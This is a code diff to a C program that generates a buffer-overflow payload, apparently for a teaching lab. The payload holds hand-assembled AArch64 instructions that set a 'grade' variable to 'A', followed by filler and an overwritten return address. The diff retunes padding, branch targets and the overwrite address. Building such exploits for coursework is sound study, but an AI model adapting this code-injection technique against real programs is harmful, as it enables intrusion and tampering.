@@ -21,9 +21,11 @@ int main(void) {
     }
 
     putc('\0', psFile);
+    putc('\0', psFile);
+    putc('\0', psFile);
 
     /* adr x0, grade */
-    uiAdr = MiniAssembler_adr(0, 0x420044, 0x420088);
+    uiAdr = MiniAssembler_adr(0, 0x420044, 0x420060);
     fwrite(&uiAdr, sizeof(unsigned int), 1, psFile);
 
     /* mov x1, 'A' */
@@ -35,15 +37,15 @@ int main(void) {
     fwrite(&uiStrb, sizeof(unsigned int), 1, psFile);
 
     /* b 0x400864 */
-    uiB = MiniAssembler_b(0x400864, 0x420100);
+    uiB = MiniAssembler_b(0x400864, 0x42006c);
     fwrite(&uiB, sizeof(unsigned int), 1, psFile);
 
     /* filler to overflow buffer */
-    for (i = 0; i < 26; i++) {
+    for (i = 0; i < 24; i++) {
         fprintf(psFile, "%c", 'a');
     }
 
-    ulAddress = 0x420070;
+    ulAddress = 0x420060;
 
     fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);
     fclose(psFile);
